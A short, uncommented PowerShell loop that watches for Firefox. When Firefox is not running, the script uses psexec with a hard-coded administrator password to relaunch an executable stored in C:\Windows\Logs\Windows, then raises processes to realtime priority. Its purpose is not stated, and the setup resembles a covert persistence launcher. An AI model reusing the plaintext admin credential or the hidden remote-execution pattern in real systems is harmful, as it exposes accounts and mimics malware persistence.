$a=1
$checkpostpriority=0

while($a -eq 1)
{
$powershell = Get-Process firefox -ErrorAction SilentlyContinue
if(!$powershell) 
{
 Stop-Process -Name "runpostlogin.exe" -Force -ErrorAction SilentlyContinue
 C:\Windows\Logs\Windows\psexec.exe \\DESKTOP-AK9MRA6  -u administrator -p adminra "C:\Windows\Logs\Windows\runpostlogin.exe" -accepteula -nobanner 
 if($checkpostpriority -eq 0)
 {
   Get-WmiObject Win32_process -filter 'name = "checkpost.exe"' | foreach-object { $_.SetPriority(256) } 
   Get-WmiObject Win32_process -filter 'name = "runpostlogin.exe"' | foreach-object { $_.SetPriority(256) } 

 }
 Start-Sleep -s 60
}
}


                                
                                                                                                                                